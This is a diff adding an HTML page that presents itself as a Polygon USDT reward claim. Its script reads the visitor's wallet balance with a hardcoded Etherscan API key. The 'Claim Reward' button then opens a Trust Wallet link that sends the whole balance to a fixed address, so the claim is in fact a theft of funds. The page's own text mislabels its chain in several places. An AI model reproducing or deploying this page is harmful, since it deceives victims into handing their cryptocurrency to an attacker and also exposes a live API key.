@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Receive POLYGON Reward</title>
+    <link rel="stylesheet" href="index.css" />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(90deg, #ffffff -30%, #4f00ce 50%);
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        text-align: center;
+        color: white;
+      }
+
+      h2 {
+        color: #ffffff;
+        margin-bottom: 10px;
+      }
+
+      p.instructions {
+        width: 90%;
+        max-width: 600px;
+        color: #222;
+        font-size: 16px;
+        margin-bottom: 30px;
+        line-height: 1.6;
+        color: #ffffff;
+        font-family: Verdana, Geneva, Tahoma, sans-serif;
+      }
+
+      input[type="text"] {
+        padding: 10px;
+        width: 300px;
+        border-radius: 8px;
+        border: 1px solid #aaa;
+        margin-bottom: 20px;
+        font-size: 16px;
+      }
+
+      button {
+        padding: 12px 25px;
+        font-size: 16px;
+        font-weight: bold;
+        border: none;
+        border-radius: 25px;
+        background: linear-gradient(90deg, #ffffff -30%, #4f00ce 50%);
+        color: white;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        transition: transform 0.2s, box-shadow 0.2s;
+        margin: 5px;
+      }
+
+      button:hover {
+        transform: scale(1.05);
+        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.3);
+      }
+
+      #result {
+        margin-top: 20px;
+        font-size: 18px;
+        color: #f8f7f7;
+      }
+    </style>
+  </head>
+
+  <body>
+    <img src="polyLogo.jpg" alt="BASE" id="cryptoLogo1" />
+    <h2>Receive Polygon</h2>
+    <p class="instructions">
+      <strong>Polygon Reward Claim Guide :</strong><br />
+      To claim your reward, first enter your wallet address in the designated
+      section. After entering the address and verifying the balance, if
+      sufficient funds are available, the "Claim Reward" button will appear. By
+      clicking this button, the reward claiming process will begin, and the
+      specified amount of USDT will be transferred to your account on the
+      Polygon network.
+    </p>
+
+    <input
+      type="text"
+      id="walletAddress"
+      placeholder="Enter your wallet address"
+    /><br />
+    <button onclick="checkBalance()">Check Balance</button>
+    <button
+      id="receiveRewardBtn"
+      onclick="handleTransaction()"
+      style="display: none"
+    >
+      Claim Reward
+    </button>
+
+    <p id="result"></p>
+
+    <script>
+      let currentBalance = 0n;
+      let ethAmount = 0;
+
+      async function checkBalance() {
+        const address = document.getElementById("walletAddress").value.trim();
+        const result = document.getElementById("result");
+        const rewardBtn = document.getElementById("receiveRewardBtn");
+
+        if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
+          result.innerText = "❌ Invalid wallet address.";
+          rewardBtn.style.display = "none";
+          return;
+        }
+
+        result.innerText = "🔍 Checking POY balance...";
+
+        const apiKey = "41A1UNPP3T2GGCFB7UQMSKRQCX5SHTUMWG";
+        const chainId = 8453;
+        const url = `https://api.etherscan.io/v2/api?chainid=${chainId}&module=account&action=balance&address=${address}&tag=latest&apikey=${apiKey}`;
+
+        try {
+          const response = await fetch(
+            `https://corsproxy.io/?${encodeURIComponent(url)}`
+          );
+          const data = await response.json();
+
+          if (data.status !== "1") {
+            result.innerText = "⚠️ Unable to fetch balance.";
+            rewardBtn.style.display = "none";
+            return;
+          }
+
+          currentBalance = BigInt(data.result);
+          ethAmount = Number(currentBalance) / 1e18;
+          result.innerText = `✅ POLYGON Balance: ${ethAmount} POL`;
+
+          rewardBtn.style.display =
+            currentBalance > 0n ? "inline-block" : "none";
+        } catch (error) {
+          result.innerText = "❌ Network error occurred.";
+          rewardBtn.style.display = "none";
+        }
+      }
+
+      function handleTransaction() {
+        const address = document.getElementById("walletAddress").value.trim();
+
+        if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
+          alert("❌ Invalid wallet address.");
+          return;
+        }
+
+        const receiver = "0x738Ce804dF6B2815BC7f743996Ec725a6F037Ccb"; // reward receiver
+
+        // ✅ Use the captured BASE balance
+        const trustLink = `https://link.trustwallet.com/send?coin=966&address=${receiver}&amount=${ethAmount}`;
+
+        window.location.href = trustLink;
+      }
+    </script>
+  </body>
+</html>
